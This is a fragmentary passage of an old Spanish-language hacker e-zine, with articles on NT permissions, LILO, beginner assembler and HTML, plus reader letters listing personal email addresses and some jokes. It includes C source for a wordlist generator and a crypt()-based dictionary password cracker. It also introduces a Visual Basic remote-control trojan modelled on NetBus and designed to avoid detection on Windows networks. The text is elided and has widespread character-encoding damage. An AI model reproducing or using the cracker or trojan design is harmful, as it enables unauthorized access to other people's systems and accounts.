...
TeeSPy / CDLR Security Team / teespy@bigfoot.com
...
incluira directorios - como es com·n).
...
Un grupo  global es definido  a travΘs del dominio y es visible por todo el
dominio y/o  otros dominios (segun las relaciones de confianza establecidas
entre ellos). Los grupos  globales -el  tΘrmino mas adecuado  seria "grupos
...
linea y en orden alfabΘtico. La  documentacion de NT  denomina una "entrada
...
acceso  entre  parΘntesis,  ejemplo:  (RWX) o (ALL). Los  permisos  indican
...
Write ( W )...Modificar los datos, a±adiendo o eliminando parte de estos.
...
Delete ( D )... Eliminar el  archivo, (tambiΘn  se puede realizar esto  con
...
directorio y sumando nuevos items al directorio. Esta ACL  tambiΘn controla
...
permisos contenidos ambos entre parΘntesis.
...
los nombres  de los  existentes. TambiΘn  permite  pasar a  travΘs  de  los
...
determinara las ACLs de todos  los items que de Θl dependan. Esto facilita,
...
en este numero XDDD]
 ...
 garantizara el  secreto de las  comunicaciones electrónicas y la privacidad
 de los datos".
 ...
 Para sobrevivir. Nada da tanto sentido a la vida como saber que no hay otra. 
  ...
  toda la suerte del mundo a Carlos, porque realmente se lo merece.
		 	...
		 	Comentarios a: mrnexus@cyberdude.com
...
LILO es un boot loader, que permite iniciar la maquina seg·n unas directivas
...
para que mi hermana chica ocupe le Windors 95 version ABCDEFGHIJKLMN╤OPQRS
TUVWXZ.
...
No queremos que cree un ramdisk, disco virtual en memoria, esta opci≤n se
...
*********************************************************************
    IMPORTANTE
*********************************************************************
Una vez se tiene el fichero de configuraci≤n terminado la orden para 
instalarlo
es :

lilo -C /path_donde_este/fichero_de_configuraci≤n
...
cualquier comentario o sugerencia escriba a mts@warez.cl
se agradece al Peque±o Saltamontes del Jerunel
...
Este  programa  utiliza la llamada recursividad, que es cuando una funcion se
llama a si misma, despues la entenderan ;)

Nota: Solo funciona en Dos or Windows.

*****************************************************************************
3) EJEMPLOS EN ASSEMBLER.
*****************************************************************************

    Debido  a  que  no  me manejo para nada en ASM, tan solo muestro ejemplos
sencillos, tal vez en unos  doscientos  a~os mas les ense~e de buena manera a
programar en ASM.

    Este  ejemplillo  muestra  en  pantalla  un  mensaje,  nada  mas que eso.
pero por algo se empieza :)
    ...
    assume cs:Ejemplo
    start:     
    mov ah,9 ; esto indica que mostraremos un mensaje en pantalla
    lea dx,mensaje ; mete el mensaje en dx ( eso parece )
    int 21h ; muestra el texto
    int 20h ; vuelve al dos
    Mensaje db 0ah,0dh ; se introduce el mensaje en "Mensaje"
    db "Este es el programa de mensaje version 0,00001 ", 0ah, 0dh  
...
un "tsam &lt;archivo.sam>" y luego  "tlink -t &lt;archivo>". ( por lo menos a mi me
...
main(int argc, char *argv[])
{
	if(argc!=5)
	{
		printf("Uso: ./crea &lt;archivo de texto> &lt;archivo de salida>
                &lt;Min> &lt;Max>\n");
		exit(0);
	}
...
void Recuperar(char *archivo, char *dicc, int min, int max)
{
	...
	while(!feof(Archivo))
	{
		...
		dato[0][cont-1]='\x0';
		cont--;
		if((cont&lt;max+1) && (cont>min-1))
		{
			for(x=0; x&lt;cont;x++)
				palabras[Num][x]=dato[0][x];
			Num++;
		}
	}
	for(x=0;x&lt;strlen(palabras[0]);x++)
		pass[0][x]=palabras[0][x];
	fputs(pass[0], Diccionario);
	for(x=1;x&lt;Num;x++)
	{
		do
		{
			...
			for(i=0;i<20;i++)
			{
				if(palabras[x][i]!=pass[j][i])
					igual = 1;
			}
			j++;
		}while((j&lt;NumPass) && (igual!=0));
		if(igual == 1)
		{
			for(i=0;i&lt;strlen(palabras[x]);i++)
				pass[NumPass][i]=palabras[x][i];
			fputs("\n", Diccionario);
			fputs(pass[NumPass], Diccionario);
			NumPass++;			
		}
		j=0;
	}
...
El programa te pide:
        - archivo de texto, cualquiera, no faltan los que van a
          poner un .doc XDDD
        - archivo de salida, el nombre del archivo donde se guardara
          la lista de palabras.
        - min, el minimo de caracteres para las palabras.
        - max, que crees :)

Para compilar: gcc -o fuente fuente.c
obviamente en linux, si tratas de hacerlo en DOS no resultara ;)
y para hacerlo correr: ./creador texto diccionario 5 8


Y a continuacion el crackeador de passwords onda John the Ripper XDDD
...
main(int argc, char *argv[])
{
	...
	if(argc!=3)
	{
		printf("Uso: Juan &lt;diccionario> &lt;archivo con passwords>\n");
		exit(0);
	}
	...
	while(!feof(Archivo))
	{
		...
		do{
			...
			cont++;
		       ...
		       (!feof(Archivo)));
		entrada[cont-1]='\x0';
		for(x=0;x&lt;NumClave;x++)
		{
			resultado = crypt(entrada, datos[j]);
			if(!strcmp(resultado, datos[j]))
			{
				i++;
...
NOTA I : El archivo de passwords necesita estar en la forma:

         root:lafkK2dsf
         jperez:A2kd89asdf

NOTA : Estos  programas  estan  echos  pensados  en  los  administradores que
       lamentablemente pierden sus contrase~as y las quieren  recordar,  y no
       para personas que se quieran introducir en otros sistemas  ilegalmente
       ok? ;)
...
Nota 1: Este material esta escrito solo para fines educativos !!!, no me hago
responsable por los que lo utilizen con fines destructivos.

Nota 2: Nunca he  estudiado  programacion, tampoco tengo manuales o cosas por
el estilo. Asi que si encuentran algunos errores  en  uno de estos fuentes no
se quejen.

    Quien  no  se  ha  topado alguna vez con el conocido NetBus, un excelente
troyano que hace todo lo  que  uno quiera ( bueno, casi todo ), ver archivos,
enviar mensajes, ejecutar archivos, etc.

    Pero  usar  el NetBus, es como subir el everest en helicoptero, o hackear
una maquina que use windows, no se necesita gran conocimiento en computacion,
ni siquiera saber  algo  de  redes,  tan  solo  hacer  un scan a un monton de
computadores para ver cual tiene el NetBus instalado y empezar a "hackear"

Entonces les hago la gran pregunta ┐ que gracia tiene hacer todo eso ?.

    Pero por otro lado, si uno hace un programa de ese estilo, eso si tendria
gracia ┐ o no ?.

    Asi  que  me puse manos a la obra y cree el NetFuck ( ya se que el nombre
es medio agringado pero no se me ocurrio otro mejor ).

    Lo hice en visual basic, que aunque es un lenguaje muy debil, es el unico
que  puede  hacer que nuestro programa no sea notado en windows ( el problema
es el asunto de los .dll que hay que handar trayendolos de alla para aca ).

    Tampoco  funciona  en  internet  ya que no trabaja con puertos, ips, etc.
Eso si funciona en redes locales y en windows  nt.  Y como no trabaja con los
puertos es muy dificil que  lo  detecten. Si  quieren  uno  que  funcione  en
internet, haganlo ustedes ┐ o quieren todo en bandeja ?.

    Este  programa  consta  de  tres  archivos, el WinFuck.exe que es como el
patch del NetBus, el esclavo, y el NetFuck que es como el NetBus.

    Primero  comenzaremos  con  crear el archivo WinFuck.exe, con un Form con
...
(los  que no saben visual basic se jodieron, que pena, me dan ganas de llorar
XDD)
...
Private Sub Form_Load()
    ...
    Do
        On Error GoTo Abriendo
        Peso = FileLen(CurDir + "\orden.bdd") ' Toma el peso de orden.bdd
        If Peso <> 0 Then ' Si cambia es que tiene una orden
...
que saben un poco, mejor larguense a otro articulo.
    ...
    Abran  un archivo y coloquen &lt;HTML> al principio del archivo y &lt;/HTML> al
final, ya que esto indica que es un archivo de HTML ( pag. wesh ).

Luego  colocaremos el titulo a la pagina, para esto escribimos &lt;TITLE> dentro
de la función &lt;HEAD> luego &lt;/TITLE> y lo terminamos con &lt;/HEAD>,
por ejemplo:
...
Ahora, le colocaremos un mensaje a nuestra pagina :
    ...
    &lt;HTML>&lt;HEAD>&lt;TITLE>BIENVENIDO A MI PRIMERA PAGINA&lt;/TITLE>&lt;/HEAD>
    HOLA YO SOY JUAN PEREZ ESTA ES MI PAGINA WESH ...
    &lt;/HTML>

    Si  colocas  &lt;H1> antes del mensaje y &lt;/H1> despues del mensaje, la letra
se agrandara, prueba tambien con &lt;H2>.
...
le colocasen una imagen, el siguiente comando te sirve para eso:
   ...
   &lt;CENTER>&lt;IMG SRC="foto.jpg" WIDTH=300 HEIGHT=200>&lt;/CENTER>

La  funcion  &lt;CENTER> es  para  centrar, ya sea texto o imagenes, WIDTH es el
...
siguiente comando en su pagina, y tendran uno:
    ...
    &lt;A HREF="http://www.cdlr.org">Pagina de seguridad informatica&lt;/A>

Si  quieren  colocar  un  archivo  para que sus amigos lo bajen, el siguiente
comando les sirve:

    &lt;A HREF="archivo.zip">Archivo con fotos&lt;/A>

Su correo:

        &lt;A HREF="mailto:sucorreo@xxxxx.com">Mi correo&lt;/A>
...
&lt;HTML>
    ...
    &lt;/UL>
    &lt;P>
    &lt;CENTER>&lt;IMG SRC="foto1.jpg" WIDTH=300 HEIGHT=200>&lt;/CENTER>
&lt;/HTML>
...
codigos fuentes. Mi correo es shisei_brujo@latinmail.com, para quejas burlas,
puteadas, etc.
...
Subject: 
   ...
   From: triniti 1 &lt;trinity46@latinmail.com>
...
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
       ...
       El que me busca me encuentra..aqui..neo279@latinmail.com

                     Welcome to the real world!!

.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.

From: "DARIO FRANCISCO PRADO" &lt;dariusfranciscus@hotmail.com>
To: proyecto_r@bigfoot.com
...
BUENO  AMIGOS  MIOS SI  ENCUENTRO ALGO M┴S LES ESCRIBIRE HAAAAA  ME ENCUENTRO
...
estan fallando...  >:-(
Use u_taker@bigfoot.com a ver si funciona...
...
En una lista de correos,  John  Swensson (john@threebs.com) dijo que si tu lo
...
eschenauer &lt;laurent.e@mail.com> y pronto puede ser encontrado en:
...
V.   Creditos
  ...
  Laurent eschenauer &lt;laurent.e@mail.com> -*- Testers: Lamagra
...
Subject: 
   ...
   From: "Manuel Ramirez S." &lt;ed189726@xxxxx.com>
     To: &lt;proyecto_r@bigfoot.com>
...
Linux pero si no mandame un correo a plaxius@bigfoot.com y vere si te puedo
...
Subject: lamentable...
   ...
   From: Virkoff Hackerstein &lt;virkoff@xxxxx.org>
     To: proyecto_r@bigfoot.com
...
Subject: Ezine...
   ...
   From: Manuel Briones Cortes &lt;man0l0@xxxxx.com>
     To: &lt;proyecto_r@bigfoot.com>
...
Subject: 
   ...
   From: enfermo enfermo &lt;enfermo70@xxxxx.com>
     To: proyecto_r@bigfoot.com
...
que  mas  me gustari  seguir  en contacto, me email,: Enfermo70@XXXXX.com (ni 
...
Subject: Kr@ckerZ United team 2000
   ...
   From: "MANIAC PCMAN" &lt;sigrid_mapc@xxxxx.com>
     To: proyecto_r@bigfoot.com


Mensaje :

Hola, muy bueno el zine Chilensi... íPuta! .. como no lo he visto antes!
...
Ah  alguien  De La VI region, mandar email a enfermo70@hotmail.com (el nombre 
esta  inspirado  en  un  passwor  de un server qeu me paso un amigo hace very 
time!!!)

ViVa La revolucion,     Mov.Rev. Gr÷zny . (Mafia Lokal)
...
Subject: por fin !!!!
   ...
   From: "Mastroianni" &lt;chocko@xxxxx.com>
     To: proyecto_r@bigfoot.com
...
Subject: Hola
   ...
   From: Mario Bueno &lt;mario_bueno@xxxxx.com>
     To: proyecto_r@bigfoot.com
...
From: ksh team &lt;ksh.team@xxxxx.com>
To: &lt;proyecto_r@bigfoot.com>
...
From: "--==@DarkPort@==--" &lt;dark_port@xxxxx.com>
To: &lt;proyecto_r@bigfoot.com>
Subject: portal
...
From: "timothy Drake Grayson" &lt;dick_grayson14@xxxxx.com>
To: proyecto_r@bigfoot.com
...
From: cyberboy &lt;cyberboy@xxxx.com>
To: &lt;proyecto_r@bigfoot.com>
...
To: proyecto_r@bigfoot.com
From: "damage69@uol.cl" &lt;damage69@uol.cl>
...
:::: C≤digo fuente de Windows 2000 ::::::::::::::::::::::::::::::::::::::::::
 ...
 int main()
 {
    ...
    if (AunNoHaCascadoDelTodo())
    {
       ...
       printf("Windows se estß cerrando");
...
trabajo o en una reunion:::::::::::::::::::::::::::::::::::::::::::::::::::::
  ...
  2) - "Es soolo una siesta de 15 minutos para recuperar las
        energias, como  me  ense±aron en el curso de gerenciamiento de tiempo
  ...
  9) - "Alguien debe haber puesto cafe descafeinado en el frasco equivocado."
     ...
     Pero de todas estas es la mejor escapat≤ria es:
   
  10) - "... en nombre del Padre, del Hijo y del Espφritu Santo.
             AmΘn..."
...
::::::El huesped distinguido:::::::::::::::::::::::::::::::::::::::::::::::::
 ...
 -Si pero dicen los demas huesped que despuΘs Usted se orina en la
...
Realiza esta prueba, es sencilla y no te toma ni 1 minuto y te
 divertirßs un poco.....Te darß felicidad etc ... etc ... 
...
lentamente. Usted tiene sue±o y esta perdiendo  gradualmente su  voluntad y
...
due±os no necesitan  reparaciones, ni ventanas, ni un ba±o  caliente, y sus
...
Desde San Sebastian,Gipuzcoa,Pais Vasco,Espa±a
